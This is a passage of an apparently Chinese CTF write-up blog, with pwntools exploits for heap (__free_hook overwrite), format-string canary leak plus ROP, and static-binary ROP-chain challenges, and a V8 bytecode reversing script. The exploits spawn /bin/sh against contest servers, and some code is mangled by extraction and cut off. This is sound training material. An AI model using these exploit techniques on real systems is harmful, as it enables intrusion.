class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("hub_2bcab892e2e5b54edbef4ccecd6f373f")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def add(size):</span><br><span class="line">    sh.recvuntil(">>")</span><br><span class="line">    sh.sendline("1")</span><br><span class="line">    sh.recvuntil("?")</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">def free(idx):</span><br><span class="line">    sh.recvuntil(">>")</span><br><span class="line">    sh.sendline("2")</span><br><span class="line">    sh.recvuntil("?")</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">def edit(content):</span><br><span class="line">    sh.recvuntil(">>")</span><br><span class="line">    sh.sendline("3")</span><br><span class="line">    sh.recvuntil("?")</span><br><span class="line">    sh.send(content)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    global sh</span><br><span class="line">    global lib</span><br><span class="line">    while True:</span><br><span class="line">        try:</span><br><span class="line">            if(debug == 1):</span><br><span class="line">                sh = process("./hub_2bcab892e2e5b54edbef4ccecd6f373f")</span><br><span class="line">                lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">            else:</span><br><span class="line">                sh = remote(ip,port)</span><br><span class="line">                lib = ELF("libc.so.6")</span><br><span class="line">            add(0xa8)</span><br><span class="line">            free(0)</span><br><span class="line">            free(0)</span><br><span class="line">            add(0x80)</span><br><span class="line">            add(0x8)</span><br><span class="line">            for i in range(8):</span><br><span class="line">                free(-0x90)</span><br><span class="line">            add(0x98)</span><br><span class="line">            free(0)</span><br><span class="line">            free(0)</span><br><span class="line">            add(0x98)</span><br><span class="line">            edit('\x10')</span><br><span class="line">            add(0x98)</span><br><span class="line">            add(0x98)</span><br><span class="line">            if debug != 0:</span><br><span class="line">                log.success("pid = " + str(sh.pid))</span><br><span class="line">            #data = input()</span><br><span class="line">            #edit(chr(data%0x100) + chr(data>>8))</span><br><span class="line">            edit('\xe8\x88')</span><br><span class="line">            add(0x80)</span><br><span class="line">            add(0x80)</span><br><span class="line">            edit(p64(elf.plt['puts']))</span><br><span class="line">            add(0x80)</span><br><span class="line">            free(0)</span><br><span class="line">            __free_hook = u64(sh.recvuntil("\x7f",timeout = 1)[-6:].ljust(8,'\x00'))</span><br><span class="line">            libc = __free_hook - lib.symbols['__free_hook']</span><br><span class="line">            system = libc + lib.symbols['system']</span><br><span class="line">            if(__free_hook <= 0):</span><br><span class="line">                        sh.close()</span><br><span class="line">                        continue</span><br><span class="line">            #edit(p64(0xdeadbeef))</span><br><span class="line">            #x/50gx &__malloc_hook</span><br><span class="line">            #x/50gx &__free_hook</span><br><span class="line">            #gdb.attach(sh</span><br><span class="line">            #0x400A49</span><br><span class="line">            break</span><br><span class="line">        except EOFError:</span><br><span class="line">            sh.close()</span><br><span class="line">            continue</span><br><span class="line">        else:</span><br><span class="line">            break</span><br><span class="line">    add(0xa8)</span><br><span class="line">    edit(p64(__free_hook))</span><br><span class="line">    add(0xa8)</span><br><span class="line">    add(0xa8)</span><br><span class="line">    edit(p64(system)) </span><br><span class="line">    add(0x200)</span><br><span class="line">    edit('/bin/sh\x00')</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    free(0)</span><br><span class="line">    log.success("system: " + hex(system))</span><br><span class="line">    log.success("__free_hook: " + hex(__free_hook))</span><br><span class="line">    log.success("libc: " + hex(libc))</span><br><span class="line">    if debug != 0:</span><br><span class="line">                log.success("pid = " + str(sh.pid))</span><br><span class="line">    sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">    pwn("47.112.139.218",13132,0)</span><br></pre></td></tr></tbody></table></figure></div><h3 id="打进去之后没有回显，只能猜flag的位置，猜测在-home-flag"><a href="#打进去之后没有回显，只能猜flag的位置，猜测在-home-flag" class="headerlink" title="打进去之后没有回显，只能猜flag的位置，猜测在/home/flag"></a>打进去之后没有回显，只能猜flag的位置，猜测在/home/flag</h3><h3 id="Flag-flag-ec56e9e92ecd5481304e047a798aa15bcde501caf2bcbc5c65402b3b"><a href="#Flag-flag-ec56e9e92ecd5481304e047a798aa15bcde501caf2bcbc5c65402b3b" class="headerlink" title="Flag: flag{ec56e9e92ecd5481304e047a798aa15bcde501caf2bcbc5c65402b3b}"></a>Flag: flag{ec56e9e92ecd5481304e047a798aa15bcde501caf2bcbc5c65402b3b}</h3><h2 id="据说大师傅们有一个io的做法来libc-leak，tql膜拜一下"><a href="#据说大师傅们有一个io的做法来libc-leak，tql膜拜一下" class="headerlink" title="据说大师傅们有一个io的做法来libc leak，tql膜拜一下"></a>据说大师傅们有一个io的做法来libc leak，tql膜拜一下</h2><h2 id="Reverse-8v"><a href="#Reverse-8v" class="headerlink" title="Reverse 8v"></a>Reverse 8v</h2><h3 id="下载过来一个文档，然后去知乎和谷歌上找各种指令的作用"><a href="#下载过来一个文档，然后去知乎和谷歌上找各种指令的作用" class="headerlink" title="下载过来一个文档，然后去知乎和谷歌上找各种指令的作用"></a>下载过来一个文档，然后去知乎和谷歌上找各种指令的作用</h3><h3 id="https-zhuanlan-zhihu-com-p-28590489"><a href="#https-zhuanlan-zhihu-com-p-28590489" class="headerlink" title="https://zhuanlan.zhihu.com/p/28590489"></a><a href="https://zhuanlan.zhihu.com/p/28590489" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/28590489</a></h3><h3 id="https-blog-zsxsoft-com-post-37"><a href="#https-blog-zsxsoft-com-post-37" class="headerlink" title="https://blog.zsxsoft.com/post/37"></a><a href="https://blog.zsxsoft.com/post/37" target="_blank" rel="noopener">https://blog.zsxsoft.com/post/37</a></h3><h3 id="看到了一些很关键的运算操作，而且文件结果有一个类似于encode的字符串"><a href="#看到了一些很关键的运算操作，而且文件结果有一个类似于encode的字符串" class="headerlink" title="看到了一些很关键的运算操作，而且文件结果有一个类似于encode的字符串"></a>看到了一些很关键的运算操作，而且文件结果有一个类似于encode的字符串</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">179 S> 0x39bf06f1f3b8 @   22 : 0c 58             LdaSmi [88]</span><br><span class="line">282 E> 0x39bf06f1f3f8 @   86 : 3b f8 0f          BitwiseXor r3, [15]</span><br><span class="line">265 E> 0x39bf06f1f3fb @   89 : 30 fa f9 16       StaKeyedProperty r1, r2, [22]</span><br><span class="line">288 S> 0x39bf06f1f3ff @   93 : 13 04 14          LdaGlobal [4], [20]</span><br><span class="line">296 E> 0x39bf06f1f402 @   96 : 42 41 1a          MulSmi [65], [26]</span><br><span class="line">301 E> 0x39bf06f1f405 @   99 : 40 42 19          AddSmi [66], [25]</span><br><span class="line"></span><br><span class="line">376 E> 0x39bf06f1f453 @  177 : 3b f8 1e          BitwiseXor r3, [30]</span><br><span class="line">370 E> 0x39bf06f1f456 @  180 : 30 fa f9 21       StaKeyedProperty r1, r2, [33]</span><br><span class="line">382 S> 0x39bf06f1f45a @  184 : 13 04 14          LdaGlobal [4], [20]</span><br><span class="line">390 E> 0x39bf06f1f45d @  187 : 42 23 25          MulSmi [35], [37]</span><br><span class="line">395 E> 0x39bf06f1f460 @  190 : 41 10 24          SubSmi [16], [36]</span><br><span class="line">401 E> 0x39bf06f1f463 @  193 : 00 44 00 01 23 00 ModSmi.Wide [256], [35]</span><br></pre></td></tr></tbody></table></figure></div><h3 id="总结一下就是以下两个式子"><a href="#总结一下就是以下两个式子" class="headerlink" title="总结一下就是以下两个式子"></a>总结一下就是以下两个式子</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">((byte1)*65+66)%256</span><br><span class="line">((byte2) *35 - 16)%256</span><br></pre></td></tr></tbody></table></figure></div><h3 id="但是其实里面还有一个逆序，一开始没有看出来，具体脚本如下"><a href="#但是其实里面还有一个逆序，一开始没有看出来，具体脚本如下" class="headerlink" title="但是其实里面还有一个逆序，一开始没有看出来，具体脚本如下"></a>但是其实里面还有一个逆序，一开始没有看出来，具体脚本如下</h3><h3 id="Exp-3"><a href="#Exp-3" class="headerlink" title="Exp:"></a>Exp:</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">key = 88</span><br><span class="line">list1 = []</span><br><span class="line">list2 = []</span><br><span class="line">list3 = []</span><br><span class="line">flag = ''</span><br><span class="line">encrypto=b'\xd2"\xf1\x8d\xb7\xe0\xd0MF\x87T?\x1fI\x1c\xe7\xcb\x07\xc3\x95z\xb3z\x0b\xbb\xdb\xa1I\xc5;'</span><br><span class="line">for i in range(0,len(encrypto)):</span><br><span class="line">list3.append(ord(encrypto[i:i+1]))</span><br><span class="line">print list3</span><br><span class="line">list1.append(key)</span><br><span class="line">for i in range(0,len(encrypto)):</span><br><span class="line">list1.append((list1[i] * 65 + 66)%256)</span><br><span class="line">print list1</span><br><span class="line">p = list1[len(list1) - 1]</span><br><span class="line">list2.append(p)</span><br><span class="line">for i in range(0,len(encrypto)-1):</span><br><span class="line">list2.append((list2[i] * 35 - 16)%256)</span><br><span class="line">list2.reverse()</span><br><span class="line">print list2</span><br><span class="line">for i in range(0,len(encrypto)):</span><br><span class="line">flag += (chr(list3[i]^list1[i]^list2[i]))</span><br><span class="line">print flag</span><br></pre></td></tr></tbody></table></figure></div><h3 id="Flag-flag-V8-ByteCode-is-Very-Easy"><a href="#Flag-flag-V8-ByteCode-is-Very-Easy" class="headerlink" title="Flag: flag{V8_ByteCode_is_Very_Easy}"></a>Flag: flag{V8_ByteCode_is_Very_Easy}</h3></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-19年第五空间网络安全大赛线上赛</title>
      <link href="/2019/08/30/CTF-19%E5%B9%B4%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
      <url>/2019/08/30/CTF-19%E5%B9%B4%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="0x1-副墨"><a href="#0x1-副墨" class="headerlink" title="0x1 副墨"></a>0x1 副墨</h2><h3 id="导入IDA，scanf没有问题，但是下面的read有问题，可以覆盖seed，所以我只要覆盖seed为0，就可以知道之后rand出来的所有的数字"><a href="#导入IDA，scanf没有问题，但是下面的read有问题，可以覆盖seed，所以我只要覆盖seed为0，就可以知道之后rand出来的所有的数字" class="headerlink" title="导入IDA，scanf没有问题，但是下面的read有问题，可以覆盖seed，所以我只要覆盖seed为0，就可以知道之后rand出来的所有的数字"></a>导入IDA，scanf没有问题，但是下面的read有问题，可以覆盖seed，所以我只要覆盖seed为0，就可以知道之后rand出来的所有的数字</h3><p><a href="/2019/08/30/CTF-19%E5%B9%B4%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9B/12.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/08/30/CTF-19%E5%B9%B4%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9B/12.png" class="lazyload"></a></p><h3 id="所以可以写一个poc，预先生成10个数字，POC如下："><a href="#所以可以写一个poc，预先生成10个数字，POC如下：" class="headerlink" title="所以可以写一个poc，预先生成10个数字，POC如下："></a>所以可以写一个poc，预先生成10个数字，POC如下：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include<stdio.h></stdio.h></span><br><span class="line">#include<stdlib.h></stdlib.h></span><br><span class="line">#include<unistd.h></unistd.h></span><br><span class="line">int main(){</span><br><span class="line">int i= 0;</span><br><span class="line">srand(0);</span><br><span class="line">for(i = 0;i<10;i++)</span><br><span class="line">printf("%d\n",rand() % 0x1869Fu + 1);</span><br><span class="line">return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h3 id="编译之后就会输出seed为0的10个随机数"><a href="#编译之后就会输出seed为0的10个随机数" class="headerlink" title="编译之后就会输出seed为0的10个随机数"></a>编译之后就会输出seed为0的10个随机数</h3><h3 id="然后通过猜数字环节之后，有一个栈溢出和格式化溢出漏洞，所以input-name的时候需要通过-p来leak-pie和canary，这样才能劫持流程"><a href="#然后通过猜数字环节之后，有一个栈溢出和格式化溢出漏洞，所以input-name的时候需要通过-p来leak-pie和canary，这样才能劫持流程" class="headerlink" title="然后通过猜数字环节之后，有一个栈溢出和格式化溢出漏洞，所以input name的时候需要通过%p来leak pie和canary，这样才能劫持流程"></a>然后通过猜数字环节之后，有一个栈溢出和格式化溢出漏洞，所以input name的时候需要通过%p来leak pie和canary，这样才能劫持流程</h3><p><a href="/2019/08/30/CTF-19%E5%B9%B4%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9B/13.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/08/30/CTF-19%E5%B9%B4%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9B/13.png" class="lazyload"></a></p><h3 id="所以直接通过这个劫持流程"><a href="#所以直接通过这个劫持流程" class="headerlink" title="所以直接通过这个劫持流程"></a>所以直接通过这个劫持流程</h3><h3 id="劫持步骤："><a href="#劫持步骤：" class="headerlink" title="劫持步骤："></a>劫持步骤：</h3><h3 id="1、因为没有看到”-bin-sh-x00”先在bss段写入该字符串，通过read实现"><a href="#1、因为没有看到”-bin-sh-x00”先在bss段写入该字符串，通过read实现" class="headerlink" title="1、因为没有看到”/bin/sh\x00”先在bss段写入该字符串，通过read实现"></a>1、因为没有看到”/bin/sh\x00”先在bss段写入该字符串，通过read实现</h3><h3 id="2、发现程序本身有system函数，所以pop-rdi，将-bin-sh-x00字符串的指针传入rdi然后跳转到system函数的位置就可以拿到shell了，具体exp如下"><a href="#2、发现程序本身有system函数，所以pop-rdi，将-bin-sh-x00字符串的指针传入rdi然后跳转到system函数的位置就可以拿到shell了，具体exp如下" class="headerlink" title="2、发现程序本身有system函数，所以pop rdi，将/bin/sh\x00字符串的指针传入rdi然后跳转到system函数的位置就可以拿到shell了，具体exp如下"></a>2、发现程序本身有system函数，所以pop rdi，将/bin/sh\x00字符串的指针传入rdi然后跳转到system函数的位置就可以拿到shell了，具体exp如下</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("bf")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">rand = [7427,39356,9595,54062,67371,42578,92585,76990,22615,53318]</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./bf")</span><br><span class="line"></span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">pop_rdi_ret = 0xdb3</span><br><span class="line">pop_rsi_r15_ret = 0xdb1</span><br><span class="line">sh.recvuntil("Are you sure want to play the game?")</span><br><span class="line">sh.sendline("1")</span><br><span class="line">offset = 0x3c - 0x20</span><br><span class="line">sh.recvuntil("Input your name : ")</span><br><span class="line">payload = ''</span><br><span class="line">payload = "%23$p,%17$p,"</span><br><span class="line">payload = payload.ljust(offset,"\x00")</span><br><span class="line">payload += p64(0)</span><br><span class="line">sh.send(payload)</span><br><span class="line">for i in rand:</span><br><span class="line">#if i == 53318:</span><br><span class="line">#input()</span><br><span class="line">sh.recvuntil("guess:")</span><br><span class="line">sh.sendline(str(i))</span><br><span class="line">sh.recvuntil("0x")</span><br><span class="line">base = int(sh.recvuntil(",",True),16) - 0xabf</span><br><span class="line">canary = int(sh.recv(18),16)</span><br><span class="line">offset = 0x3c - 8</span><br><span class="line">payload = offset * "a"</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += p64(0)</span><br><span class="line">payload += p64(base + pop_rdi_ret)</span><br><span class="line">payload += p64(0)</span><br><span class="line">payload += p64(base + pop_rsi_r15_ret)</span><br><span class="line">payload += p64(base + elf.bss())</span><br><span class="line">payload += p64(0)</span><br><span class="line">payload += p64(base + elf.plt['read'])</span><br><span class="line">payload += p64(base + pop_rdi_ret)</span><br><span class="line">payload += p64(base + elf.bss())</span><br><span class="line">payload += p64(base + 0xab3)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.sendline("/bin/sh\x00")</span><br><span class="line">log.success("canary: " + hex(canary))</span><br><span class="line">log.success("base: " + hex(base))</span><br><span class="line">sh.sendline("./flag.sh 1DJB8HC51KLT4E00000020PJUKVB5SHD")</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("111.33.164.6",50001 ,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x2-坐忘"><a href="#0x2-坐忘" class="headerlink" title="0x2 坐忘"></a>0x2 坐忘</h2><h3 id="导入IDA，发现我们发送的数据被放到堆块里，而且我们发送的数据需要被base64加密，然后解密后会放到v5的位置。"><a href="#导入IDA，发现我们发送的数据被放到堆块里，而且我们发送的数据需要被base64加密，然后解密后会放到v5的位置。" class="headerlink" title="导入IDA，发现我们发送的数据被放到堆块里，而且我们发送的数据需要被base64加密，然后解密后会放到v5的位置。"></a>导入IDA，发现我们发送的数据被放到堆块里，而且我们发送的数据需要被base64加密，然后解密后会放到v5的位置。</h3><p><a href="/2019/08/30/CTF-19%E5%B9%B4%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9B/14.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/08/30/CTF-19%E5%B9%B4%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9B/14.png" class="lazyload"></a></p><h3 id="然后漏洞也是很明显的，他对解密之后的文本没有限制，而且我们写入1000长度的数据，解密之后也是远远可以覆盖ret地址的。但是这个程序开了canary，我们可以通过puts-amp-v5-来leak-canary，我们只需要第一次发送的加密文本解密之后刚好覆盖到canary的最后一位-x00，没有了-x00截断就会把canary一并输出出来，然后末尾清零就好了。"><a href="#然后漏洞也是很明显的，他对解密之后的文本没有限制，而且我们写入1000长度的数据，解密之后也是远远可以覆盖ret地址的。但是这个程序开了canary，我们可以通过puts-amp-v5-来leak-canary，我们只需要第一次发送的加密文本解密之后刚好覆盖到canary的最后一位-x00，没有了-x00截断就会把canary一并输出出来，然后末尾清零就好了。" class="headerlink" title="然后漏洞也是很明显的，他对解密之后的文本没有限制，而且我们写入1000长度的数据，解密之后也是远远可以覆盖ret地址的。但是这个程序开了canary，我们可以通过puts(&v5)来leak canary，我们只需要第一次发送的加密文本解密之后刚好覆盖到canary的最后一位\x00，没有了\x00截断就会把canary一并输出出来，然后末尾清零就好了。"></a>然后漏洞也是很明显的，他对解密之后的文本没有限制，而且我们写入1000长度的数据，解密之后也是远远可以覆盖ret地址的。但是这个程序开了canary，我们可以通过puts(&v5)来leak canary，我们只需要第一次发送的加密文本解密之后刚好覆盖到canary的最后一位\x00，没有了\x00截断就会把canary一并输出出来，然后末尾清零就好了。</h3><p>当然我们还需要继续循环，所以我们不能输入no，然后第二次解密只要输入很长的payload就好了，考虑到他是静态编译，所以考虑使用ROPgadget –binary pwn –ropchain，生成的代码来拿shell</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">from struct import pack</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("pwn9")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def rop():</span><br><span class="line">p = ''</span><br><span class="line">p += pack('<q', 0x0000000000401f57) # pop rsi ; ret< span><br><span class="line">p += pack('<q', 0x00000000006cb080) # @ .data< span><br><span class="line">p += pack('<q', 0x00000000004715e4) # pop rax ; ret< span><br><span class="line">p += '/bin//sh'</span><br><span class="line">p += pack('<q', 0x000000000047cd21) # mov qword ptr [rsi], rax ; ret< span><br><span class="line">p += pack('<q', 0x0000000000401f57) # pop rsi ; ret< span><br><span class="line">p += pack('<q', 0x00000000006cb088) # @ .data + 8< span><br><span class="line">p += pack('<q', 0x0000000000426baf) # xor rax, rax ; ret< span><br><span class="line">p += pack('<q', 0x000000000047cd21) # mov qword ptr [rsi], rax ; ret< span><br><span class="line">p += pack('<q', 0x0000000000401e36) # pop rdi ; ret< span><br><span class="line">p += pack('<q', 0x00000000006cb080) # @ .data< span><br><span class="line">p += pack('<q', 0x0000000000401f57) # pop rsi ; ret< span><br><span class="line">p += pack('<q', 0x00000000006cb088) # @ .data + 8< span><br><span class="line">p += pack('<q', 0x00000000004433e6) # pop rdx ; ret< span><br><span class="line">p += pack('<q', 0x00000000006cb088) # @ .data + 8< span><br><span class="line">p += pack('<q', 0x0000000000426baf) # xor rax, rax ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 